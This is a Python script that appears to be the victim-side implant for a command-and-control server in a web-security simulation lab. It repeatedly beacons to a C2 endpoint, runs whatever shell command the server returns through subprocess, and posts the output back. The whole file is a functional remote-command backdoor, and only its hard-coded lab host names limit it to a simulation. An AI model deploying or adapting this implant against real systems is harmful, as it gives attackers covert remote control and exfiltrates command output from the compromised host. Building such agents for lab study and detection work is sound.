import requests
import time
import subprocess

C2 = "http://websecsim-fastapi:8000"
HOSTNAME = "websecsim-victim-c2"

def wait_for_c2():
    print("[*] Waiting for C2 server...")
    while True:
        try:
            r = requests.get(f"{C2}/health", timeout=3)
            if r.status_code == 200:
                print("[+] Connected to C2")
                return
        except:
            print("[*] C2 not ready yet...")
        time.sleep(3)

wait_for_c2()

while True:
    try:
        beacon = requests.post(
            f"{C2}/c2/beacon",
            json={"host": HOSTNAME},
            timeout=10
        )

        data = beacon.json()
        task = data.get("task")

        if task:
            command = task.get("command")
            technique = task.get("technique")

            print(f"[+] Executing {technique}: {command}")
            result = subprocess.getoutput(command)

            requests.post(
                f"{C2}/c2/output",
                json={
                    "host": HOSTNAME,
                    "technique": technique,
                    "output": result
                }
            )
        else:
            print("[*] No task")

    except Exception as e:
        print("[!] Beacon error:", e)

    time.sleep(5)
